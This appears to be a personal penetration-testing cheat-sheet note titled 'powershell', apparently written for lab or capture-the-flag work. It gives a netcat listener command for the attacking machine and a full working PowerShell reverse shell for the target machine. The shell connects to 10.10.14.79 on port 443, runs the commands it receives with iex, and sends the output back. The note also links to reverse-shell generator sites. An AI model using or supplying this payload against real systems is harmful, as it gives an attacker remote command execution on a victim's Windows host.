---
note_tags:
  - windows
  - payload
---
# powershell

**Author:** Julien Bongars\
**Date:** 2026-01-05 02:41:33
**Path:**

---

## Source Machine

```bash
nc -lvnp 443
```

## Target Machine

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.79',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

Refer to [bash reverse shell](./bash.md) for more.

## Resources

- [revshells.com](https://www.revshells.com/) — generate PowerShell reverse shells
- [PayloadsAllTheThings reverse shell cheatsheet](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/) — extra payloads
